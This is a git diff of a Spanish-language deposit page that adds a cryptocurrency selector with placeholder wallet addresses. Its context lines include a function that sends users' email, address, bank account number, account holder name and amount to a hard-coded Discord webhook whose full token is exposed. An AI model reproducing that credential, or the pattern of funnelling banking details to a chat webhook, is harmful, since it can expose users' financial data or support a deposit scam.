@@ -57,7 +57,26 @@
 </head>
 <body>
   <div class="container">
-       <h1 style="color: #fff;">Depósito de Saldo en USD</h1>
+        <h1>Depósito de Saldo</h1>
+        <p style="font-size: 18px;">Complete el siguiente formulario para cargar saldo a su cuenta. Seleccione la moneda de su depósito.</p>
+
+        <div class="input-group">
+            <label for="moneda">Moneda:</label>
+            <select id="moneda" onchange="actualizarDatosDeposito()">
+                <option value="USD">USD</option>
+                <option value="USDT">USDT</option>
+                <option value="BTC">BTC</option>
+                <option value="ETH">ETH</option>
+                <option value="BNB">BNB</option>
+            </select>
+        </div>
+
+        <!-- Campos para mostrar la dirección y la red -->
+        <div class="input-group" id="infoDeposito" style="display: none;">
+            <p><strong>Dirección para el Depósito:</strong> <span id="direccionDeposito"></span></p>
+            <p><strong>Red de Envío:</strong> <span id="redEnvio"></span></p>
+        </div>
+
         <p style="color: #fff; font-size: 18px;">Complete el siguiente formulario de depósito para cargar saldo en dólares estadounidenses (USD) a su cuenta. Una vez enviado, procesaremos su depósito y le enviaremos un correo electrónico de confirmación.</p>
         <div class="input-group">
             <label for="alias">Alias de Depósito:</label>
@@ -105,6 +124,34 @@
     </div>
 
     <script>
+
+ const datosDeposito = {
+            "USD": { direccion: "N/A", red: "Transferencia Bancaria/PayPal" },
+            "USDT": { direccion: "0xUSDTExampleAddress", red: "ERC20" },
+            "BTC": { direccion: "1BTCExampleAddress", red: "Bitcoin Network" },
+            "ETH": { direccion: "0xETHExampleAddress", red: "ERC20" },
+            "BNB": { direccion: "bnbExampleAddress", red: "BEP2" }
+        };
+
+        function actualizarDatosDeposito() {
+            const moneda = document.getElementById("moneda").value;
+            const infoDeposito = document.getElementById("infoDeposito");
+            const direccionDeposito = document.getElementById("direccionDeposito");
+            const redEnvio = document.getElementById("redEnvio");
+
+            if (datosDeposito[moneda]) {
+                direccionDeposito.textContent = datosDeposito[moneda].direccion;
+                redEnvio.textContent = datosDeposito[moneda].red;
+                infoDeposito.style.display = 'block';
+            } else {
+                infoDeposito.style.display = 'none';
+            }
+        }
+
+
+
+
+        
 function enviarDatosAlWebhook(correo, direccion, capturaURL, numeroCuenta, titularCuenta, monto) {
     var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
     var payload = {
